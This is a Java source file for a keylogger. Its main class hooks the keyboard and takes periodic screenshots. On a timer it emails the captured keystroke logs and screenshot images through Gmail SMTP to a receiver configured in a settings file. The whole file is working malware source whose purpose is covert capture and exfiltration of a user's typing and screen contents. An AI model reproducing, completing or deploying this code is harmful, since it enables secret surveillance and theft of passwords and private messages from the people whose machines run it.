package keylogger;

import java.awt.AWTException;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import static java.nio.file.StandardCopyOption.*;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;

public class KeyLogger extends TimerTask{
    
    Map<String, String> settings;
    KeyLogsDataPress logs;
    
    KeyLogger(Map<String, String> settings,
              KeyLogsDataPress logs) throws AWTException, IOException{
        this.settings = settings;
        this.logs = logs;
    }
    
    void SendEmail(){
        System.out.println("Sending Information");
        
        Map<String, String> inlineImages = new HashMap<String, String>();
        inlineImages.put("image1", "Images/screenshot.jpg");
        inlineImages.put("image2", "Images/screenshot.jpg");

        String host = "smtp.gmail.com";
        String port = "465";
        String subject = "Test e-mail with inline images";

        try {
            EmbeddedImageEmailUtil.send(
                    host, 
                    port, 
                    settings.get("SENDER"), 
                    settings.get("SENDER_PASSWORD"), 
                    settings.get("RECEIVER"),
                    settings.get("SUBJECT"), 
                    logs.GetLogs(), 
                    inlineImages);
            System.out.println("Email sent.");
        } catch (Exception ex) {
            System.out.println("Could not send email.");
            ex.printStackTrace();
        }
    }
    @Override
    public void run() {
        try {
            new SaveScreenshot();
        } catch (AWTException ex) {
            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
        }
        SendEmail();
        logs.ClearData();
    }
    public static void main(String[] args) throws IOException, AWTException {
    String settings_path = new JFileChooser().getFileSystemView().getDefaultDirectory().toString()+
                "\\settings.txt";
        
    File tmpDir = new File(settings_path);
    if (tmpDir.isDirectory()){
        KeyLogsDataPress log = KeyLogsDataPress.getInstance();
        
        new KeyBoardHookListener(log.GetLogs());
        Map<String, String> settings = new GetSettingsData(settings_path).GetSettings();

        Timer timer = new Timer();
        timer.schedule(new KeyLogger(settings,log), 0, Integer.parseInt(
            settings.get("INTERVAL")
        ));
        }else{
            try {
                Files.copy(new File("settings\\settings.txt").toPath(), 
                        tmpDir.toPath(),
                        REPLACE_EXISTING);
            }catch(IOException e){
                e.printStackTrace();
            }
        JOptionPane.showMessageDialog(null,
                "File settings template successfuly created!"
            );
        }
    }
}